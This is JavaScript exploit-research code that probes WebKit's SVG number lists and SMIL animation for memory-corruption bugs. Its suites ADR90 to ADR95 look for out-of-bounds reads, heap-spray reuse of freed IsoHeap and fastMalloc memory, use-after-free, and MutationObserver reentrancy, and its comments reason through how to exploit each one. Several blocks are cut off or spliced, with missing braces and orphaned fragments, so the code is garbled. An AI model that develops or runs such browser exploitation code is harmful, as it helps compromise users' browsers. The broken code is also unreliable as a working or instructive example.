// SMIL still interpolating 20 items.
// animVal[19] might do: baseVal.getItem(19) → OOB on 19-item vector.
// OR: animVal[19] reads SMIL's own 20-item animated list → no OOB.
// OR: animVal[19] reads freed SVGNumber (old item[19] freed by removeItem).
//
// SMIL for feColorMatrix uses SVGAnimatedNumberList.
// animVal is a separate list maintained by SMIL.
// But SMIL must READ from baseVal to know the "from" values.
// During interpolation: animated[i] = lerp(from[i], to[i], t)
//   where from[i] = baseVal[i] at animation start
// from[] might be cached at animation start (snapshot) OR live-read.
//
// This test:
// 1. Setup: 20-item list, SMIL animation from all-0 to all-1000
// 2. Before removeItem: record all 20 animVal values across 5 frames
// 3. removeItem(0) at frame 5
// 4. After removeItem: read ALL 20 animVal indices each frame
//    - animVal[0..18]: should be in range
//    - animVal[19]: OOB candidate → freed SVGNumber or garbage?
// 5. Check: does animVal.numberOfItems still = 20?
// 6. Check: animVal[19] value bits → any pointer-like values?
// ═══════════════════════════════════════════════════════════════
suites['ADR90']=function(){
  L('ADR90: SMIL animVal[19] OOB — all-index read during bvCount=19 window','info');
  var N=20;
  var from90=initVals(N,function(i){return 0;});
  var to90=initVals(N,function(i){return 1000;});
  var o90=makeFe(from90);
  var anim90=document.createElementNS(SVG_NS,'animate');
  anim90.setAttribute('attributeName','values');
  anim90.setAttribute('from',from90.join(' '));
  anim90.setAttribute('to',to90.join(' '));
  anim90.setAttribute('dur','10s');
  anim90.setAttribute('repeatCount','indefinite');
  o90.fe.appendChild(anim90);
  var T90_stale=o90.fe.values.baseVal.getItem(0);// grab item[0] BEFORE removeItem
  var frameCount=0;
  var removeDone=false;
  var oobFound=[];
  function frame90(){
    var avCount=o90.fe.values.animVal.numberOfItems;
    var bvCount=o90.fe.values.baseVal.numberOfItems;
    // Read ALL animVal indices
    var avVals=[];
    for(var i=0;i<Math.max(avCount,N);i++){
      try{
        var v=o90.fe.values.animVal.getItem(i).value;
        avVals.push(v);
        if(isOOB(v)){
          oobFound.push({frame:frameCount,idx:i,val:v,bits:f32hex(v)});
          L('★★★ ADR90 frame '+frameCount+' animVal['+i+']='+v+' bits='+f32hex(v)+' OOB!','hit');

      removeDone=true;

      try{o90.fe.values.baseVal.removeItem(0);}catch(e){L('ADR90: removeItem threw: '+e.message,'miss');}
      var bvAfter=o90.fe.values.baseVal.numberOfItems;
      var avAfter=o90.fe.values.animVal.numberOfItems;
      L('ADR90: post-remove: bvCount='+bvAfter+' avCount='+avAfter,'info');
    }
    // Log key frames
    if(frameCount<=8||frameCount===14){
      var row='ADR90 f'+frameCount+': bv='+bvCount+' av='+avCount+' av[0]='+( typeof avVals[0]==='number'?avVals[0].toFixed(2):avVals[0])+' av[19]='+( typeof avVals[19]==='number'?avVals[19].toFixed(2):avVals[19]);
      L(row,frameCount>=5?'warn':'info');

    frameCount++;
    if(frameCount<20)requestAnimationFrame(frame90);
    else{
      L('ADR90: 20 frames done. OOB events: '+oobFound.length,'info');
      if(oobFound.length===0)L('ADR90: no OOB values detected in animVal[0..19]','info');
      o90.svg.remove();

  requestAnimationFrame(frame90);

// ═══════════════════════════════════════════════════════════════
// ADR92 — IsoHeap spray during removeItem cycle
//
// When removeItem(0) is called: SVGNumber at index 0 has its RefPtr
// decremented in the list's vector. If NO TearOff holds it, it frees
// to IsoHeap. If we DON'T grab a TearOff before removeItem, the SVGNumber
// is freed (IsoHeap bump-only = permanently dead).
//
// BUT: what about the 160-byte WTF::Vector buffer in SVGNumberList?
// After removeItem shifts elements: does it reallocate the buffer? No.
// WTF::Vector::remove() shifts elements in place, same buffer.
// The freed slot is at position 19 (last position after shift) —
// but it's still within the capacity, just past size(). Not freed.
//
// DIFFERENT ANGLE: what about the SVGNumber freed by removeItem
// when NO TearOff holds it?
//
// Setup:
// A) DON'T grab TearOff for item 0
// B) removeItem(0) → SVGNumber[0] freed to IsoHeap (no RefPtr holding it)
// C) Spray new SVGNumbers from new lists → do any land in old slot?
// D) Check if the newly-freed SVGNumber's IsoHeap slot gets reused
//

// So step D will always fail. IsoHeap freed slots = dead.
//
// BUT: is there a way to use the freed-SVGNumber scenario to create a
// dangling pointer scenario? The SVGNumber was freed. If ANYTHING still
// holds a raw pointer to it...
//
// Actually: after removeItem, the vector shifts. The vector has capacity 20.
// New size = 19. Position [19] in the buffer now holds the last RefPtr<SVGNumber>
// that was shifted. All 19 RefPtrs now at [0..18]. Position [19] has a stale
// RefPtr (the vector's old [19] value is still in the buffer at raw address
// [19*8], but size says 19 items). The vector doesn't zero position [19].
//
// Wait: WTF::Vector::remove() for RefPtr types: it moves elements forward,
// but the last position (now past-size) still holds a RefPtr that wasn't
// destructed. Normally WTF::Vector is supposed to call the destructor...
//
// Let's test this differently. Instead of IsoHeap:
// 1. Create list A with 20 items (NO TearOffs grabbed)
// 2. removeItem(0) on list A → SVGNumber[0] freed to IsoHeap, bump-only = dead
// 3. Create list B with 20 items → fresh SVGNumbers in IsoHeap
// 4. Remove list B entirely → list B's SVGNumbers freed
// 5. Create list C → does list C reuse list B's IsoHeap slots? (IsoHeap bump-only = no)
// 6. INSTEAD: focus on fastMalloc Vector buffer reuse
//    Remove entire list A → Vector buffer (160 bytes) freed to fastMalloc
//    Create list B → might get same Vector buffer (fastMalloc has free list)
//    Check if list B's SVGNumbers have unexpected values (from list A's layout)
//
// This is the fastMalloc spray test for the Vector buffer.
// ═══════════════════════════════════════════════════════════════

  // Make list_A with distinctive canary values
  var CANARY_A=1337.0;
  var vals_A=initVals(20,function(i){return CANARY_A+(i*0.001);});
  var oA=makeFe(vals_A);

    }

  // But: if we modify list_B's items (via new TearOffs) and then FREE list_B,

  // This doesn't help for exploitation but confirms the fastMalloc free-list behavior.

  var oA4=makeFe(vals_A);oA4.svg.remove();
  var t0=performance.now();
  var oFast=makeFe(vals_B);
  var t1=performance.now();

  // Try reading any "ghost" data that might survive in the freshly-allocated list
  // by using mismatched types: what if we get a list_C allocated at list_A's address,
  // and the parser initializes SVGNumbers from the XML attribute string (always clean)?

  L('ADR92: focus stays on ADR88-E: removeItem notification path (the live one).','info');

  oB.svg.remove();oFast.svg.remove();

  // BUT: there is one thing we HAVEN'T tested: what if we spray many large fastMalloc

  // The stale notification writes through the SVGNumber, not the vector directly.
  // The notification calls itemChanged → svgAttributeChanged → no vector dereference.
  // Confirmed: no vector OOB from notification path.
  L('ADR92: the itemChanged path does NOT dereference the vector. confirmed by ADR85 (no item corruption).','info');
};

  var oSrc=makeFe(initVals(N,function(i){return i===0?55555:0;}));
  var canaryItem=oSrc.fe.values.baseVal.getItem(0);

  var frameCount=0;
  var results93=[];
  function frame93(){
    var av=[];
    for(var i=0;i<N;i++){
      try{av.push(o93.fe.values.animVal.getItem(i).value);}catch(e){av.push(NaN);}
    }
    if(frameCount===3){
      L('ADR93: frame 3 — removeItem(0) then getComputedStyle then insertItemBefore(55555)','warn');
      // Step A: removeItem
      try{o93.fe.values.baseVal.removeItem(0);}catch(e){L('removeItem err: '+e,'miss');}
      // Step B: force layout (might trigger SMIL mid-animation)
      var cs=window.getComputedStyle(o93.fe);
      var forcedLayout=cs.getPropertyValue('opacity');// force style recalc
      // Step C: insertItemBefore canary
      try{o93.fe.values.baseVal.insertItemBefore(canaryItem,0);}catch(e){L('insert err: '+e,'miss');}
      // Step D: immediate read
      var avImmediate=[];
      for(var i=0;i<N;i++){
        try{avImmediate.push(o93.fe.values.animVal.getItem(i).value);}catch(e){avImmediate.push(NaN);}
      }
      L('ADR93 f3 immediate: av[0]='+avImmediate[0].toFixed(2)+' av[19]='+avImmediate[19].toFixed(2),'warn');
      for(var i=0;i<N;i++){
        if(isOOB(avImmediate[i])||Math.abs(avImmediate[i]-55555)<1){
          L('★★★ ADR93: animVal['+i+']='+avImmediate[i]+' CONTROLLED/OOB!','hit');
        }
      }
    }
    results93.push({f:frameCount,av0:av[0],av19:av[19],bv:o93.fe.values.baseVal.numberOfItems});
    frameCount++;
    if(frameCount<10)requestAnimationFrame(frame93);
    else{
      L('ADR93: results:','info');
      results93.forEach(function(r){
        var oob=(isOOB(r.av0)||isOOB(r.av19))?'★OOB':'';
        L('  f'+r.f+': bv='+r.bv+' av[0]='+r.av0.toFixed(2)+' av[19]='+r.av19.toFixed(2)+' '+oob,'info');
      });
      oSrc.svg.remove();o93.svg.remove();
    }
  }
  requestAnimationFrame(frame93);
};

// ═══════════════════════════════════════════════════════════════
// ADR94 — multi-index OOB: removeItem(10), read animVal[10..19]
//
// Instead of removeItem(0), try removeItem(10) — middle of the list.
// After remove: bvCount=19, items shift: old[11..19] → new[10..18].
// animVal might still have 20 entries.
// Check animVal[10..19] all indices for OOB values.
//
// Also test: removeItem at different positions (0, 5, 10, 19)
// Check if OOB leaks appear at the boundary index.
//
// The hypothesis: if SMIL uses the index directly from its interpolation
// and the removed position causes an off-by-one, we'd see it at index N-1
// or at the removal index itself.
// ═══════════════════════════════════════════════════════════════
suites['ADR94']=function(){
  L('ADR94: multi-position removeItem — check all animVal indices for OOB','info');
  var N=20;
  var from94=initVals(N,function(i){return 0;});
  var to94=initVals(N,function(i){return 1000;});

  function testRemoveAt(pos,cb){
    var o=makeFe(from94);
    var anim=document.createElementNS(SVG_NS,'animate');
    anim.setAttribute('attributeName','values');
    anim.setAttribute('from',from94.join(' '));
    anim.setAttribute('to',to94.join(' '));
    anim.setAttribute('dur','5s');
    anim.setAttribute('repeatCount','indefinite');
    o.fe.appendChild(anim);
    var fc=0;
    var oobAt=[];
    function f(){
      if(fc===2){
        try{o.fe.values.baseVal.removeItem(pos);}catch(e){}
      }
      if(fc>=2&&fc<=5){
        var avCount=o.fe.values.animVal.numberOfItems;
        for(var i=0;i<N+1;i++){
          try{
            var v=o.fe.values.animVal.getItem(i).value;
            if(isOOB(v)){oobAt.push({f:fc,i:i,v:v,bits:f32hex(v)});}
          }catch(e){if(i<N)oobAt.push({f:fc,i:i,v:'throw:'+e.message});}
        }
      }
      fc++;
      if(fc<8)requestAnimationFrame(f);
      else{
        if(oobAt.length>0){
          L('★★★ ADR94 removeItem('+pos+'): OOB events:','hit');
          oobAt.forEach(function(x){L('  f'+x.f+' av['+x.i+']='+x.v+(x.bits?' bits='+x.bits:''),'hit');});
        } else {
          L('ADR94 removeItem('+pos+'): no OOB in animVal[0..'+N+']','info');
        }
        o.svg.remove();
        cb();
      }
    }
    requestAnimationFrame(f);
  }

  // Test positions sequentially via callbacks
  testRemoveAt(0,function(){
    testRemoveAt(5,function(){
      testRemoveAt(10,function(){
        testRemoveAt(19,function(){
          L('ADR94: all positions tested.','info');
        });
      });
    });
  });
};

// ═══════════════════════════════════════════════════════════════
// ADR95 — cascaded notify: stale write → itemChanged → svgAttributeChanged
//          → does it fire a JS event we can hook?
//
// When stale TearOff write fires notification → itemChanged → svgAttributeChanged:
// WebKit's svgAttributeChanged might fire SVG DOM events or mutation observers.
// If a JS MutationObserver or event listener fires DURING the C++ notification chain,
// we get JS execution mid-stack. This enables a reentrancy scenario.
//
// From that reentrant JS call, we could:
// - Do another removeItem (further shrink the list while itemChanged is in-flight)
// - Force another notification
// - Create a deeper nesting of itemChanged calls
// - Potentially cause a use-after-free by freeing the list while itemChanged is using it
//
// Test:
// 1. Setup MutationObserver on feColorMatrix's attributes
// 2. Setup SVG event listener for any related events
// 3. removeItem(0) from baseVal → now stale TearOff is ready
// 4. Before stale write: ARM the mutation observer to do something aggressive
//    (another removeItem, or free the element)
// 5. Do stale TearOff write → fires notification → svgAttributeChanged
//    → does MutationObserver fire synchronously? Or async?
// 6. If synchronous: we get JS reentrancy mid-notification chain
// ═══════════════════════════════════════════════════════════════
suites['ADR95']=function(){
  L('ADR95: cascaded notify — does svgAttributeChanged fire MutationObserver synchronously?','info');
  var vals95=initVals(20,function(i){return (i+1)*100;});
  var o95=makeFe(vals95);
  var fe95=o95.fe;
  var observerFired=false;
  var observerMutations=[];
  var reentrancyDepth=0;
  var reentrancyActions=[];

  // Observe attribute mutations on feColorMatrix
  var mo=new MutationObserver(function(mutations){
    observerFired=true;
    mutations.forEach(function(m){
      observerMutations.push({attr:m.attributeName,old:m.oldValue,new:fe95.getAttribute(m.attributeName)});
      reentrancyDepth++;
      // DO SOMETHING AGGRESSIVE while in the observer callback:
      if(reentrancyDepth===1){
        // Try to removeItem again from baseVal
        try{
          var bvCount=fe95.values.baseVal.numberOfItems;
          if(bvCount>1){
            fe95.values.baseVal.removeItem(0);
            reentrancyActions.push('removeItem(0) in observer. bvCount='+bvCount+'→'+(bvCount-1));
          }
        }catch(e){reentrancyActions.push('removeItem threw: '+e.message);}
        // Try to remove the element entirely
        // fe95.remove(); // don't do this, would kill all further tests
      }
      reentrancyDepth--;
    });
  });
  mo.observe(fe95,{attributes:true,attributeOldValue:true});
  L('ADR95: MutationObserver armed on feColorMatrix','info');

  // Grab stale TearOff
  var T95=fe95.values.baseVal.getItem(0);
  fe95.values.baseVal.removeItem(0);
  L('ADR95: removeItem(0) done. bvCount='+fe95.values.baseVal.numberOfItems,'info');

  // Do stale write — fires notification → svgAttributeChanged → might update attribute → MO fires
  L('ADR95: writing to stale TearOff (T95.value=88888)...','info');
  T95.value=88888;
  L('ADR95: write done.','info');

  // Check if observer fired synchronously
  if(observerFired){
    L('★★★ ADR95: MutationObserver fired SYNCHRONOUSLY during stale write!','hit');
    observerMutations.forEach(function(m,i){L('  mutation '+i+': attr='+m.attr+' new='+m.new,'hit');});
    if(reentrancyActions.length>0){
      L('★★★ ADR95: reentrancy actions executed:','hit');
      reentrancyActions.forEach(function(a){L('  '+a,'hit');});
    }
  } else {
    L('ADR95: observer NOT fired synchronously. Checking async...','info');
    // Check after a tick
    setTimeout(function(){
      if(observerFired){
        L('ADR95: observer fired ASYNC (microtask/timeout). mutations='+observerMutations.length,'warn');
        observerMutations.forEach(function(m){L('  attr='+m.attr+' new='+m.new,'warn');});
        L('ADR95: async MO = no reentrancy possible. Stale write did fire svgAttributeChanged though.','info');
      } else {
        L('ADR95: observer NEVER fired. Stale write did NOT cause svgAttributeChanged after all.','info');
        L('ADR95: recall ADR88-E: 1ms was from some other work, not attribute write.','info');
      }
      // Final state
      L('ADR95: final bvCount='+fe95.values.baseVal.numberOfItems,'info');
      L('ADR95: final getAttribute='+fe95.getAttribute('values').substring(0,50),'info');
      mo.disconnect();
      o95.svg.remove();
    },50);
  }

  // Also: try requestAnimationFrame timing — does the observer fire BEFORE next rAF?
  requestAnimationFrame(function(){
    L('ADR95 rAF: observer fired before rAF? '+observerFired,'info');
  });

  // Write more to stale TearOff to see if observer fires on each write
  L('ADR95: writing 5 more times to stale TearOff...','info');
  for(var i=0;i<5;i++) T95.value=i*1000+11111;
  L('ADR95: 5 more writes done. total mutations observed so far: '+observerMutations.length,'info');
};
